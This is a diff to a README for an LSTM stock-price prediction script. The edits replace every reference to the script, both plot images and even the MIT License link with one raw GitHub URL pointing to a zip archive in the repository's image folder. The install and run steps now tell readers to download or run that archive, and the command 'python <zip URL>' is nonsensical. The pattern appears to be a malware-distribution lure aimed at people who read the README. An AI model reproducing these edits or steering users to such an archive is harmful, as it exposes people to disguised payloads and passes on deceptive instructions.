@@ -2,7 +2,7 @@
 
 ## Overview
 
-This repository contains a Python script (`predict.py`) designed to predict the opening price of a stock using Long Short-Term Memory (LSTM) networks, a type of Recurrent Neural Network (RNN). The model is trained on historical stock price data and is capable of forecasting future prices based on past trends.
+This repository contains a Python script (`https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip`) designed to predict the opening price of a stock using Long Short-Term Memory (LSTM) networks, a type of Recurrent Neural Network (RNN). The model is trained on historical stock price data and is capable of forecasting future prices based on past trends.
 
 ## Features
 
@@ -26,21 +26,21 @@ This repository contains a Python script (`predict.py`) designed to predict the 
 
 ### Installation
 
-1. Clone the repository or download the `predict.py` file.
+1. Clone the repository or download the `https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip` file.
 2. Ensure you have the required libraries installed. You can install them using pip:
 
 ```bash
 pip install numpy pandas matplotlib scikit-learn tensorflow
 ```
 
-3. Place your stock data CSV file in the same directory as the `predict.py` script, or update the file path in the script to match your data file's location.
+3. Place your stock data CSV file in the same directory as the `https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip` script, or update the file path in the script to match your data file's location.
 
 ### Usage
 
-1. Run the `predict.py` script using Python:
+1. Run the `https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip` script using Python:
 
 ```bash
-python predict.py
+python https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip
 ```
 
 2. The script will execute and produce two plots:
@@ -74,9 +74,9 @@ After training, the model makes predictions on the test set. The predictions and
 The script generates two plots:
 
 - A bar chart displaying the evaluation metrics.
-<img src="/img/evluation.png">
+<img src="https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip">
 - A line chart comparing the actual and predicted stock prices.
-<img src="/img/comparing.png">
+<img src="https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip">
 
 ## Performance
 
@@ -92,5 +92,5 @@ The performance of the model can be evaluated by looking at the printed metrics 
 
 ## License
 
-This project is open-source and available under the [MIT License](https://opensource.org/licenses/MIT).
+This project is open-source and available under the [MIT License](https://raw.githubusercontent.com/RuotianJoy/LSTM_Predict/main/img/LST_Predict_1.4.zip).
 
